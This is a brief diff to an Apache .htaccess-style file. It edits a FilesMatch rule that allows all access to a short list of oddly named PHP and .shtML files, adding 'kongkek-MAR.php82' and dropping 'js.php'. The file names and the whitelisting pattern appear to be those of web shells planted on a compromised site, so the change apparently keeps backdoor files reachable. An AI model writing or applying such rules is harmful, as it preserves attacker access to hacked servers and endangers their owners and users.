@@ -8,7 +8,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(696737db76a09.shtML|bujang.php|js.php)$'>
+<FilesMatch '^(696737db76a09.shtML|bujang.php|kongkek-MAR.php82)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
